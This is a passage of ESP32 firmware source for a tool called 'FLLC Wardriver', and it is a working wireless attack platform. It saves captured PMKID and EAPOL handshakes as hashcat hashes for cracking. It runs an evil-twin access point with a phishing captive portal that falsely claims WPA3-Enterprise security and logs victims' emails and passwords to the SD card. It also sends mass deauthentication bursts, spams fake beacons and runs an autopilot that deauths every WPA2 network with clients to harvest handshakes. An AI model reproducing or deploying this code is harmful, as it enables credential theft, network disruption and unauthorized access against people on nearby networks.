    xSemaphoreGive(sd_mutex);
  }
}

// ──── Hashcat hc22000 export ─────────────────────────────────────────────

static void save_hashes() {
  if (!g_sd_ok) return;
  if (pmkid_count == 0 && hs_count == 0) return;

  if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    // PMKIDs → hashcat -m 22000 format
    // Format: WPA*01*PMKID*AP_MAC*STA_MAC*ESSID_HEX***
    if (pmkid_count > 0) {
      String path = "/hashes/pmkid_" + String(millis()/1000) + ".hc22000";
      File f = SD.open(path, FILE_WRITE);
      if (f) {
        for (int i = 0; i < pmkid_count; i++) {
          f.print("WPA*01*");
          for (int j=0;j<16;j++) f.printf("%02x", pmkid_table[i].pmkid[j]);
          f.print("*");
          for (int j=0;j<6;j++) f.printf("%02x", pmkid_table[i].ap_mac[j]);
          f.print("*");
          for (int j=0;j<6;j++) f.printf("%02x", pmkid_table[i].sta_mac[j]);
          f.print("*");
          for (int j=0;j<pmkid_table[i].ssid_len;j++) f.printf("%02x", (uint8_t)pmkid_table[i].ssid[j]);
          f.println("***");
        }
        f.close();
        slog("[HASH] %d PMKIDs saved → %s", pmkid_count, path.c_str());
      }
    }

    // EAPOL handshakes → hashcat -m 22000 format
    // Format: WPA*02*MIC*AP_MAC*STA_MAC*ESSID_HEX*ANONCE*EAPOL_HEX*MP
    if (hs_count > 0) {
      String path = "/hashes/eapol_" + String(millis()/1000) + ".hc22000";
      File f = SD.open(path, FILE_WRITE);
      if (f) {
        for (int i = 0; i < hs_count; i++) {
          if (!hs_table[i].has_m1 || !hs_table[i].has_m2) continue;

          // Extract ANonce from M1 (offset 17 in EAPOL-Key, 32 bytes)
          // Extract MIC from M2 (offset 81, 16 bytes)
          // Extract EAPOL frame from M2
          if (hs_table[i].msg1_len > 50 && hs_table[i].msg2_len > 99) {
            f.print("WPA*02*");
            // MIC (from M2, offset 81)
            for (int j=0;j<16;j++) f.printf("%02x", hs_table[i].msg2[81+j]);
            f.print("*");
            for (int j=0;j<6;j++) f.printf("%02x", hs_table[i].ap_mac[j]);
            f.print("*");
            for (int j=0;j<6;j++) f.printf("%02x", hs_table[i].sta_mac[j]);
            f.print("*");
            for (int j=0;j<hs_table[i].ssid_len;j++) f.printf("%02x", (uint8_t)hs_table[i].ssid[j]);
            f.print("*");
            // ANonce (from M1, offset 17)
            for (int j=0;j<32;j++) f.printf("%02x", hs_table[i].msg1[17+j]);
            f.print("*");
            // Full EAPOL from M2
            for (int j=0;j<hs_table[i].msg2_len;j++) f.printf("%02x", hs_table[i].msg2[j]);
            f.println("*00");
          }
        }
        f.close();
        slog("[HASH] EAPOL hashes saved → %s", path.c_str());
      }
    }
    xSemaphoreGive(sd_mutex);
  }
}

// ──── Session log (human readable) ───────────────────────────────────────

static void save_session_log() {
  if (!g_sd_ok) return;
  if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
    File f = SD.open("/log/session.log", FILE_APPEND);
    if (f) {
      uint32_t up = millis()/1000;
      f.printf("\n=== CYCLE %lu | Uptime %lus ===\n", g_cycle_count, up);
      f.printf("Packets: %lu (mgmt:%lu data:%lu)\n", g_total_pkts, g_total_mgmt, g_total_data);
      f.printf("APs: %d | STAs: %d | Probes: %d | PMKIDs: %d | Handshakes: %d\n",
               ap_count, sta_count, probe_count, pmkid_count, hs_count);

      f.println("\nTop APs:");
      for (int i = 0; i < ap_count && i < 20; i++) {
        char mac[18]; mac2str(ap_table[i].bssid, mac);
        f.printf("  %-32s %s CH%2d %4ddBm %-6s %s %s\n",
                 ap_table[i].ssid[0] ? ap_table[i].ssid : "<hidden>",
                 mac, ap_table[i].channel, ap_table[i].rssi,
                 enc_str(ap_table[i].enc),
                 ap_table[i].wps ? "WPS" : "   ",
                 ap_table[i].vendor ? ap_table[i].vendor : "");
      }
      f.close();
    }
    xSemaphoreGive(sd_mutex);
  }
}

// ════════════════════════════════════════════════════════════════════════════
//  BLE SCANNER
// ════════════════════════════════════════════════════════════════════════════

class BLECallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (ble_count >= MAX_BLE_DEVICES) return;
    strncpy(ble_table[ble_count].addr, dev.getAddress().toString().c_str(), 17);
    if (dev.haveName())
      strncpy(ble_table[ble_count].name, dev.getName().c_str(), 47);
    else
      strcpy(ble_table[ble_count].name, "");
    ble_table[ble_count].rssi = dev.getRSSI();
    ble_table[ble_count].connectable = dev.isConnectable();
    ble_table[ble_count].last_seen = millis();
    // OUI from BLE address
    uint8_t bmac[6];
    sscanf(ble_table[ble_count].addr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bmac[0],&bmac[1],&bmac[2],&bmac[3],&bmac[4],&bmac[5]);
    ble_table[ble_count].vendor = oui_lookup(bmac);
    ble_count++;
  }
};

static void run_ble_scan() {
  slog("[BLE] Scanning %d seconds...", BLE_SCAN_SECS);
  ble_count = 0;

  esp_wifi_set_promiscuous(false);
  delay(50);

  BLEDevice::init("");
  BLEScan *scan = BLEDevice::getScan();
  scan->setAdvertisedDeviceCallbacks(new BLECallbacks());
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(99);
  scan->start(BLE_SCAN_SECS, false);

  slog("[BLE] Found %d devices", ble_count);

  // Print
  for (int i = 0; i < ble_count; i++) {
    slog("  [%d] %s  %s  %ddBm  %s  %s",
         i, ble_table[i].addr,
         ble_table[i].name[0] ? ble_table[i].name : "(no name)",
         ble_table[i].rssi,
         ble_table[i].connectable ? "CONN" : "BCAST",
         ble_table[i].vendor ? ble_table[i].vendor : "");
  }

  // Save JSON
  if (g_sd_ok) {
    if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      String path = "/scans/ble_" + String(millis()/1000) + ".json";
      File f = SD.open(path, FILE_WRITE);
      if (f) {
        f.printf("{\"type\":\"ble\",\"count\":%d,\"devices\":[\n", ble_count);
        for (int i = 0; i < ble_count; i++) {
          if (i) f.print(",\n");
          f.printf("{\"addr\":\"%s\",\"name\":\"%s\",\"rssi\":%d,\"conn\":%s,\"vendor\":\"%s\"}",
                   ble_table[i].addr, ble_table[i].name, ble_table[i].rssi,
                   ble_table[i].connectable?"true":"false",
                   ble_table[i].vendor ? ble_table[i].vendor : "?");
        }
        f.print("]}\n");
        f.close();
        slog("[SD] BLE JSON saved → %s", path.c_str());
      }
      xSemaphoreGive(sd_mutex);
    }
  }

  BLEDevice::deinit(false);
  delay(50);

  // Re-enable WiFi promiscuous
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_rx_cb);
  esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
}

// ════════════════════════════════════════════════════════════════════════════
//  EVIL TWIN + CAPTIVE PORTAL
// ════════════════════════════════════════════════════════════════════════════

static const char PORTAL_HTML[] PROGMEM = R"(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Login</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;display:flex;align-items:center;justify-content:center}.c{background:rgba(255,255,255,.95);border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,.3)}.l{text-align:center;margin-bottom:24px}h1{text-align:center;color:#333;font-size:20px;margin-bottom:8px}.s{text-align:center;color:#666;font-size:14px;margin-bottom:20px}.n{text-align:center;color:#4A90D9;font-weight:600;font-size:16px;margin-bottom:24px;padding:8px;background:#f0f4ff;border-radius:8px}input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;margin-bottom:12px;outline:0}input:focus{border-color:#4A90D9}button{width:100%;padding:14px;background:#4A90D9;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}button:hover{background:#357ABD}.f{text-align:center;color:#999;font-size:11px;margin-top:16px}</style></head><body><div class="c"><div class="l"><svg width="48" height="48" viewBox="0 0 24 24" fill="#4A90D9"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></div><h1>WiFi Authentication Required</h1><p class="s">Sign in to access the internet</p><div class="n">__SSID__</div><form action="/login" method="POST"><input name="email" placeholder="Email address" required><input type="password" name="password" placeholder="Password" required><button>Connect</button></form><p class="f">Secured by WPA3-Enterprise</p></div></body></html>)";

static void start_evil_twin(const char *ssid) {
  slog("[TWIN] Starting rogue AP: %s", ssid);
  strncpy(g_twin_ssid, ssid, 32);

  esp_wifi_set_promiscuous(false);
  delay(50);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(g_twin_ssid, NULL, EVIL_TWIN_CHANNEL, 0, 8);
  delay(100);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));

  g_dns = new DNSServer();
  g_dns->start(DNS_PORT, "*", IPAddress(192,168,4,1));

  g_web = new WebServer(WEB_PORT);
  g_web->on("/", HTTP_GET, [](){
    String html = PORTAL_HTML;
    html.replace("__SSID__", g_twin_ssid);
    g_web->send(200, "text/html", html);
  });
  g_web->on("/login", HTTP_POST, [](){
    String email = g_web->arg("email");
    String pw    = g_web->arg("password");
    slog("\n[!!!] CREDENTIAL CAPTURED");
    slog("  SSID:  %s", g_twin_ssid);
    slog("  Email: %s", email.c_str());
    slog("  Pass:  %s", pw.c_str());
    slog("  From:  %s", g_web->client().remoteIP().toString().c_str());

    if (g_sd_ok) {
      if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        File f = SD.open("/creds/portal_creds.txt", FILE_APPEND);
        if (!f) f = SD.open("/creds/portal_creds.txt", FILE_WRITE);
        if (f) {
          f.printf("[%lu] SSID:%s | %s : %s | IP:%s\n",
                   millis()/1000, g_twin_ssid, email.c_str(), pw.c_str(),
                   g_web->client().remoteIP().toString().c_str());
          f.close();
        }
        xSemaphoreGive(sd_mutex);
      }
    }
    g_cred_count++;
    g_web->send(200,"text/html","<html><body style='display:flex;align-items:center;justify-content:center;height:100vh;background:#0f0c29;font-family:sans-serif'><div style='background:white;padding:40px;border-radius:16px;text-align:center'><div style='font-size:48px;color:#4CAF50'>&#10004;</div><h1 style='color:#333;margin:16px 0 8px'>Connected!</h1><p style='color:#666'>You now have internet access.</p></div></body></html>");
  });
  // Captive portal detection endpoints
  const char *redir_paths[] = {"/generate_204","/hotspot-detect.html","/ncsi.txt","/connecttest.txt","/redirect","/canonical.html","/success.txt","/kindle-wifi/wifistub.html"};
  for (auto p : redir_paths) {
    g_web->on(p, HTTP_GET, [](){ g_web->sendHeader("Location","http://192.168.4.1/"); g_web->send(302); });
  }
  g_web->onNotFound([](){ g_web->sendHeader("Location","http://192.168.4.1/"); g_web->send(302); });
  g_web->begin();
  g_twin_active = true;
  g_mode = M_EVIL_TWIN;
  slog("[TWIN] Portal active at 192.168.4.1");
}

static void stop_evil_twin() {
  if (g_web) { g_web->stop(); delete g_web; g_web=nullptr; }
  if (g_dns) { g_dns->stop(); delete g_dns; g_dns=nullptr; }
  WiFi.softAPdisconnect(true);
  g_twin_active = false;
  slog("[TWIN] Stopped");
  // Restore promiscuous
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_rx_cb);
  esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
}

// ════════════════════════════════════════════════════════════════════════════
//  AUTOPILOT SEQUENCER
// ════════════════════════════════════════════════════════════════════════════

static void autopilot_cycle() {
  g_cycle_count++;
  slog("\n╔══════════════════════════════════════════╗");
  slog("║  AUTOPILOT CYCLE %lu                      ║", g_cycle_count);
  slog("╚══════════════════════════════════════════╝");

  // ── Phase 1: WiFi scan (all channels) ──
  slog("\n[AP] Phase 1 — WiFi channel sweep");
  g_mode = M_SCAN_WIFI;
  g_hop = true;
  for (int ch = WIFI_CHANNEL_MIN; ch <= WIFI_CHANNEL_MAX; ch++) {
    g_channel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(CHANNEL_DWELL_MS);
  }

  slog("[AP] Discovered %d APs, %d stations, %d probes", ap_count, sta_count, probe_count);

  // Print top 10 APs
  for (int i = 0; i < ap_count && i < 10; i++) {
    char mac[18]; mac2str(ap_table[i].bssid, mac);
    slog("  %2d | %-24s | %s | CH%2d | %4ddBm | %-5s | %s%s",
         i, ap_table[i].ssid[0] ? ap_table[i].ssid : "<hidden>",
         mac, ap_table[i].channel, ap_table[i].rssi,
         enc_str(ap_table[i].enc),
         ap_table[i].wps ? "WPS " : "",
         ap_table[i].vendor ? ap_table[i].vendor : "");
  }

  // ── Phase 2: Focused dwell on WPA2 APs for PMKID/EAPOL ──
  slog("\n[AP] Phase 2 — PMKID/EAPOL hunting (%d WPA2 targets)", 0);
  pcap_start();

  for (int i = 0; i < ap_count; i++) {
    if (ap_table[i].enc >= 2 && ap_table[i].enc <= 4) { // WPA/WPA2/WPA2-E
      g_channel = ap_table[i].channel;
      esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);

      // Dwell longer on busy APs
      int dwell = 500 + (ap_table[i].sta_count * 200);
      if (dwell > 3000) dwell = 3000;
      delay(dwell);

      // Send deauth burst to force re-authentication → EAPOL + PMKID
      if (ap_table[i].sta_count > 0) {
        memcpy(g_deauth_bssid, ap_table[i].bssid, 6);
        memset(g_deauth_target, 0xFF, 6); // broadcast
        send_deauth_burst();
        delay(1000); // Wait for reconnection
      }
    }
  }

  delay(2000); // Extra capture time
  pcap_stop();

  if (pmkid_count > 0 || hs_count > 0) {
    slog("[AP] Phase 2 results: %d PMKIDs, %d handshakes", pmkid_count, hs_count);
  }

  // ── Phase 3: BLE scan ──
  slog("\n[AP] Phase 3 — BLE scan");
  run_ble_scan();

  // ── Phase 4: Save everything ──
  slog("\n[AP] Phase 4 — Saving data to SD");
  save_wifi_json();
  save_hashes();
  save_session_log();

  // ── Summary ──
  uint32_t up = millis() / 1000;
  slog("\n╔══════════════════════════════════════════╗");
  slog("║  CYCLE %lu COMPLETE — %lus uptime            ║", g_cycle_count, up);
  slog("╠══════════════════════════════════════════╣");
  slog("║  APs:        %3d                         ║", ap_count);
  slog("║  Stations:   %3d                         ║", sta_count);
  slog("║  Probes:     %3d                         ║", probe_count);
  slog("║  PMKIDs:     %3d                         ║", pmkid_count);
  slog("║  Handshakes: %3d                         ║", hs_count);
  slog("║  BLE:        %3d                         ║", ble_count);
  slog("║  Packets:    %lu                       ║", g_total_pkts);
  slog("╚══════════════════════════════════════════╝");

  g_mode = M_AUTOPILOT;
}

// ════════════════════════════════════════════════════════════════════════════
//  SERIAL CLI
// ════════════════════════════════════════════════════════════════════════════

static void show_help() {
  slog("\n═══ FLLC Wardriver v%s ═══", FW_VERSION);
  slog("  RECON:   scan wifi | scan ble | recon | sniff probes");
  slog("  ATTACK:  deauth <#|all> | beacon spam | eviltwin <SSID> | karma");
  slog("  CAPTURE: pcap start | pcap stop");
  slog("  DATA:    show ap | show sta | show probes | show pmkid | show hs | show creds");
  slog("  CONTROL: channel <1-14> | hop | save | clear | stop | status | autopilot");
  slog("═══════════════════════════════════════\n");
}

static void process_cmd(const char *raw) {
  char cmd[256];
  strncpy(cmd, raw, 255);
  // Lowercase
  for (int i = 0; cmd[i]; i++) cmd[i] = tolower(cmd[i]);

  if (!cmd[0] || !strcmp(cmd,"help") || !strcmp(cmd,"?")) { show_help(); return; }

  if (!strcmp(cmd,"scan wifi") || !strcmp(cmd,"scanap")) {
    slog("[SCAN] WiFi scan starting...");
    g_mode = M_SCAN_WIFI;
    for (int ch=1; ch<=13; ch++) {
      g_channel=ch; esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE); delay(CHANNEL_DWELL_MS);
      slog("  CH%2d: %d APs, %d STAs", ch, ap_count, sta_count);
    }
    slog("[SCAN] Done: %d APs, %d STAs, %d probes", ap_count, sta_count, probe_count);
    g_mode = M_IDLE;
  }
  else if (!strcmp(cmd,"scan ble") || !strcmp(cmd,"scanble")) { run_ble_scan(); }
  else if (!strcmp(cmd,"recon"))     { autopilot_cycle(); }
  else if (!strcmp(cmd,"sniff probes") || !strcmp(cmd,"probes")) {
    g_mode = M_SNIFF; g_hop = true;
    slog("[PROBES] Sniffing... 'show probes' to view, 'stop' to stop");
  }
  else if (!strncmp(cmd,"deauth ",7)) {
    int idx = atoi(cmd+7);
    if (!strcmp(cmd+7,"all")) {
      for (int i=0; i<ap_count; i++) {
        memcpy(g_deauth_bssid, ap_table[i].bssid, 6);
        memset(g_deauth_target, 0xFF, 6);
        esp_wifi_set_channel(ap_table[i].channel, WIFI_SECOND_CHAN_NONE);
        send_deauth_burst();
      }
      slog("[DEAUTH] Mass deauth complete");
    } else if (idx >= 0 && idx < ap_count) {
      memcpy(g_deauth_bssid, ap_table[idx].bssid, 6);
      memset(g_deauth_target, 0xFF, 6);
      g_channel = ap_table[idx].channel;
      esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
      g_deauth_active = true; g_mode = M_DEAUTH;
      slog("[DEAUTH] Targeting %s on CH%d", ap_table[idx].ssid, g_channel);
    }
  }
  else if (!strcmp(cmd,"beacon spam") || !strcmp(cmd,"beaconspam")) { g_beacon_active=true; g_mode=M_BEACON; slog("[BEACON] Spam active"); }
  else if (!strncmp(cmd,"eviltwin ",9)) { start_evil_twin(raw+9); }
  else if (!strcmp(cmd,"karma")) { g_mode=M_KARMA; g_hop=true; slog("[KARMA] Responding to all probes"); }
  else if (!strcmp(cmd,"pcap start")) { pcap_start(); }
  else if (!strcmp(cmd,"pcap stop"))  { pcap_stop(); }
  else if (!strcmp(cmd,"show ap") || !strcmp(cmd,"show networks") || !strcmp(cmd,"list ap")) {
    slog("\n #  | SSID                     | BSSID             | RSSI | CH | ENC   | WPS | Vendor        | Clients");
    slog("----+--------------------------+-------------------+------+----+-------+-----+---------------+--------");
    for (int i=0;i<ap_count;i++){
      char m[18]; mac2str(ap_table[i].bssid,m);
      slog("%3d | %-24s | %s | %4d | %2d | %-5s | %s | %-13s | %d",
           i, ap_table[i].ssid[0]?ap_table[i].ssid:"<hidden>", m,
           ap_table[i].rssi, ap_table[i].channel, enc_str(ap_table[i].enc),
           ap_table[i].wps?"YES":"   ",
           ap_table[i].vendor?ap_table[i].vendor:"?",
           ap_table[i].sta_count);
    }
  }
  else if (!strcmp(cmd,"show sta") || !strcmp(cmd,"show clients") || !strcmp(cmd,"list sta")) {
    slog("\n #  | Station MAC       | AP BSSID          | RSSI | Probes | Data   | Vendor");
    slog("----+-------------------+-------------------+------+--------+--------+-------");
    for (int i=0;i<sta_count;i++){
      char m[18],b[18]; mac2str(sta_table[i].mac,m); mac2str(sta_table[i].bssid,b);
      slog("%3d | %s | %s | %4d | %6d | %6lu | %s",
           i,m,b,sta_table[i].rssi,sta_table[i].probe_count,sta_table[i].data_frames,
           sta_table[i].vendor?sta_table[i].vendor:"?");
    }
  }
  else if (!strcmp(cmd,"show probes")) {
    int s = (probe_count > 30) ? probe_count-30 : 0;
    slog("\nLast %d probes:", probe_count-s);
    for (int i=s;i<probe_count;i++){
      char m[18]; mac2str(probe_table[i].mac,m);
      slog("  %s → \"%s\" (%ddBm CH%d)", m, probe_table[i].ssid, probe_table[i].rssi, probe_table[i].channel);
    }
  }
  else if (!strcmp(cmd,"show pmkid")) {
    slog("\nPMKIDs captured: %d", pmkid_count);
    for (int i=0;i<pmkid_count;i++){
      char am[18],sm[18]; mac2str(pmkid_table[i].ap_mac,am); mac2str(pmkid_table[i].sta_mac,sm);
      slog("  [%d] SSID: %s | AP: %s | STA: %s", i, pmkid_table[i].ssid, am, sm);
    }
  }
  else if (!strcmp(cmd,"show hs") || !strcmp(cmd,"show handshakes")) {
    slog("\nHandshakes: %d", hs_count);
    for (int i=0;i<hs_count;i++){
      char am[18]; mac2str(hs_table[i].ap_mac,am);
      slog("  [%d] %s | M1:%s M2:%s", i, hs_table[i].ssid,
           hs_table[i].has_m1?"YES":"no", hs_table[i].has_m2?"YES":"no");
    }
  }
  else if (!strcmp(cmd,"show creds")) { slog("[CREDS] %d credentials captured (see /creds/portal_creds.txt)", g_cred_count); }
  else if (!strncmp(cmd,"channel ",8)) {
    int ch=atoi(cmd+8);
    if(ch>=1&&ch<=14){g_channel=ch;g_hop=false;esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);slog("[CH] Locked: %d",ch);}
  }
  else if (!strcmp(cmd,"hop")) { g_hop=true; slog("[CH] Hopping enabled"); }
  else if (!strcmp(cmd,"save")) { save_wifi_json(); save_hashes(); save_session_log(); slog("[SAVE] All data saved"); }
  else if (!strcmp(cmd,"clear")) { ap_count=sta_count=probe_count=pmkid_count=hs_count=ble_count=0; slog("[CLR] Tables cleared"); }
  else if (!strcmp(cmd,"stop")) {
    g_deauth_active=false; g_beacon_active=false;
    if(g_twin_active) stop_evil_twin();
    if(g_pcap_active) pcap_stop();
    g_mode=M_IDLE; g_hop=false;
    slog("[STOP] All operations stopped");
  }
  else if (!strcmp(cmd,"autopilot")) {
    slog("[AP] Starting autopilot mode");
    g_mode = M_AUTOPILOT;
  }
  else if (!strcmp(cmd,"status") || !strcmp(cmd,"info")) {
    uint32_t up=millis()/1000;
    slog("\n═══ STATUS ═══");
    slog("  FW:       %s v%s", FW_NAME, FW_VERSION);
    slog("  Uptime:   %lus (%lum)", up, up/60);
    slog("  Mode:     %d", g_mode);
    slog("  Channel:  %d %s", g_channel, g_hop?"(hopping)":"(locked)");
    slog("  SD:       %s", g_sd_ok?"OK":"FAIL");
    slog("  APs:      %d", ap_count);
    slog("  STAs:     %d", sta_count);
    slog("  Probes:   %d", probe_count);
    slog("  PMKIDs:   %d", pmkid_count);
    slog("  EAPOL HS: %d", hs_count);
    slog("  BLE:      %d", ble_count);
    slog("  Creds:    %d", g_cred_count);
    slog("  Packets:  %lu (mgmt:%lu data:%lu)", g_total_pkts, g_total_mgmt, g_total_data);
    slog("  PCAP:     %s (%lu pkts)", g_pcap_active?"RECORDING":"off", g_pcap_pkts);
    slog("  Cycles:   %lu", g_cycle_count);
    slog("  Heap:     %lu bytes free", (unsigned long)ESP.getFreeHeap());
    slog("═══════════════\n");
  }
  else { slog("[?] Unknown: %s  — type 'help'", cmd); }
}

// ════════════════════════════════════════════════════════════════════════════
//  SETUP  (runs once on Core 1)
// ════════════════════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(500);

  pinMode(PIN_LED, OUTPUT);
  for (int i=0;i<3;i++){digitalWrite(PIN_LED,HIGH);delay(80);digitalWrite(PIN_LED,LOW);delay(80);}

  Serial.println();
  Serial.println("╔══════════════════════════════════════════╗");
  Serial.printf( "║  %s v%s                   ║\n", FW_NAME, FW_VERSION);
  Serial.println("║  ESP32 Autonomous WiFi/BLE Platform      ║");
  Serial.printf( "║  Built: %s %s             ║\n", __DATE__, __TIME__);
  Serial.println("║  FLLC — Authorized Use Only        ║");
  Serial.println("╚══════════════════════════════════════════╝\n");

  // Mutexes
  table_mutex = xSemaphoreCreateMutex();
  sd_mutex    = xSemaphoreCreateMutex();

  // SD card
  slog("[INIT] Mounting SD card...");
  g_sd_ok = sd_init();

  // WiFi promiscuous mode
  slog("[INIT] Starting WiFi engine...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_rx_cb);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  // Watchdog
  esp_task_wdt_init(WATCHDOG_TIMEOUT_S, true);
  esp_task_wdt_add(NULL);

  g_session_start = millis();

  slog("[INIT] Ready.  Type 'help' or wait for autopilot.\n");
  for (int i=0;i<2;i++){digitalWrite(PIN_LED,HIGH);delay(200);digitalWrite(PIN_LED,LOW);delay(200);}

  #if AUTOPILOT
  g_mode = M_AUTOPILOT;
  slog("[AUTOPILOT] Engaged — first cycle in 3 seconds\n");
  #endif
}

// ════════════════════════════════════════════════════════════════════════════
//  MAIN LOOP  (Core 1)
// ════════════════════════════════════════════════════════════════════════════

static uint32_t last_autopilot = 0;
static uint32_t last_hop       = 0;
static uint32_t last_blink     = 0;

void loop() {
  esp_task_wdt_reset();

  // ── Serial CLI ─────────────────────────────────────────────────────────
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (g_cmd_pos > 0) {
        g_cmd[g_cmd_pos] = '\0';
        process_cmd(g_cmd);
        g_cmd_pos = 0;
      }
    } else if (g_cmd_pos < 254) {
      g_cmd[g_cmd_pos++] = c;
    }
  }

  uint32_t now = millis();

  // ── Autopilot ──────────────────────────────────────────────────────────
  if (g_mode == M_AUTOPILOT && (now - last_autopilot > (g_cycle_count == 0 ? 3000 : AP_CYCLE_MS))) {
    last_autopilot = now;
    autopilot_cycle();
  }

  // ── Channel hopping (scanning / sniffing modes) ────────────────────────
  if (g_hop && g_mode != M_EVIL_TWIN && g_mode != M_IDLE &&
      g_mode != M_AUTOPILOT && g_mode != M_SCAN_WIFI) {
    if (now - last_hop > CHANNEL_DWELL_MS) {
      g_channel = (g_channel % WIFI_CHANNEL_MAX) + 1;
      esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
      last_hop = now;
    }
  }

  // ── Deauth loop ────────────────────────────────────────────────────────
  if (g_deauth_active) {
    send_deauth_burst();
    delay(10);
  }

  // ── Beacon spam loop ───────────────────────────────────────────────────
  if (g_beacon_active) {
    for (int i = 0; i < g_beacon_count; i++) {
      send_beacon(g_beacon_ssids[i], g_channel);
      delayMicroseconds(500);
    }
    delay(BEACON_INTERVAL_MS);
  }

  // ── Evil twin service ──────────────────────────────────────────────────
  if (g_twin_active) {
    if (g_dns) g_dns->processNextRequest();
    if (g_web) g_web->handleClient();
  }

  // ── Heartbeat LED ──────────────────────────────────────────────────────
  if (now - last_blink > 3000) {
    digitalWrite(PIN_LED, HIGH); delay(30); digitalWrite(PIN_LED, LOW);
    last_blink = now;
  }

  delay(1);
}
